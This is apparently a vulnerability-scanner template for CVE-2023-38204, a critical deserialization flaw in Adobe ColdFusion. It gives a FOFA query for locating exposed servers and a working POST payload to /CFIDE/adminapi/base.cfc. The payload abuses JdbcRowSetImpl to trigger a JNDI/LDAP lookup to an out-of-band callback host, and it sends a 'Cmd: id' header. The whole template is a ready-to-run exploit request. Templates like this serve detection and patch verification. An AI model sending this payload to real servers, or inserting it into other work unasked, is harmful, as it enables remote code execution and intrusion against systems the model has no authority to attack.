id: CVE-2023-38204

info:
  name: Adobe ColdFusion 序列化漏洞
  author: zan8in
  severity: critical
  verified: true
  description: |-
    fofa: app="Adobe-ColdFusion"
  reference:
    - https://mp.weixin.qq.com/s/vLvh7TEsyXWPona2gw3Szg
    - https://nvd.nist.gov/vuln/detail/CVE-2023-38204
  tags: cve,cve2023,coldfusion,unserialize
  created: 2023/10/11

set:
  oob: oob()
  oobDNS: oob.DNS
rules:
  r0:
    request:
      method: POST
      path: /CFIDE/adminapi/base.cfc?method
      headers:
        Cmd: id
      body: |
        argumentCollection=<wddxPacket+version%3d'1.0'><header/><data><struct+type%3d'xcom.sun.rowset.JdbcRowSetImplx'><var+name%3d'dataSourceName'><string>ldap%3a//{{oobDNS}}</string></var><var+name%3d'autoCommit'><boolean+value%3d'true'/></var></struct></data></wddxPacket>
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
